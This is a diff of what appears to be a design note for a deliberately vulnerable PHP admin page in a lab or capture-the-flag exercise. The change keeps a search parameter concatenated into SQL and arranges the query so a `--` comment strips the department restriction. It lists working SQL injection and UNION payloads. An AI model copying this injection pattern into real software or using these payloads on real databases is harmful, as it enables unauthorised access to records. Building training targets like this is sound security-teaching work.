@@ -62,35 +62,35 @@ File: `www/admin/students.php`
 
 ```php
 $q = trim((string)($_GET['q'] ?? ''));
+$deptSafe = $db->escapeString($admin_dept);
 
 $query = "
-    SELECT ..., s.department, (...enrolled_courses...)
+    SELECT s.student_id, s.first_name, s.last_name, s.department,
+           ( ...enrolled_courses... )
     FROM students s
     LEFT JOIN marks m ON s.student_id = m.student_id
     WHERE
-        ( s.first_name LIKE '%$q%'
-          OR s.last_name LIKE '%$q%'
-          OR s.student_id LIKE '%$q%'
-          OR s.department LIKE '%$q%' )
-        AND s.department = :department
-    ORDER BY s.student_id
-    LIMIT 25
+        ( s.first_name LIKE '%$q%' OR s.last_name LIKE '%$q%'
+          OR s.student_id LIKE '%$q%' OR s.department LIKE '%$q%' )
+        AND s.department = '$deptSafe' ORDER BY s.student_id LIMIT 25
 ";
-$stmt  = $db->prepare($query);
-$stmt->bindValue(':department', $admin_dept, SQLITE3_TEXT);
 ```
 
-- The `$q` value is concatenated directly into SQL (`%$q%`), while the
-  department constraint is bound separately. A payload that terminates
-  the LIKE expression (e.g. `') OR 1=1 --`) also escapes the clerk-view
-  restriction.
-- Because the point sits *inside* `LIKE '%$q%'`, the working payload
-  shape is `') ... --`:
+- The `$q` value is concatenated directly into SQL (`%$q%`); the
+  department constraint is embedded as a **safe literal** (server-derived,
+  `escapeString()`ed) rather than a placeholder. A payload that terminates
+  the LIKE expression also escapes the clerk-view limit.
+- The whole tail (`AND s.department ... LIMIT 25`) is kept on a single
+  line on purpose: SQLite's `--` comments out to end-of-line, so a `--`
+  payload cleanly kills the restriction + ordering + limit.
+- Working payload shapes:
   ```text
   q=') OR 1=1 --
   q=') UNION SELECT type,name,tbl_name,rootpage,sql FROM sqlite_master --
   q=') UNION SELECT id,note,note_date,1,2 FROM compliance_notes --
   ```
+  (Because each LIKE is `'%$q%'`, `')` closes the quoted literal and the
+  FROM/paren group.)
 - Column count for the SELECT list (needed for `UNION` payloads) is **5**:
   `student_id, first_name, last_name, department, enrolled_courses`.
   Unioned rows land in those fixed output columns.
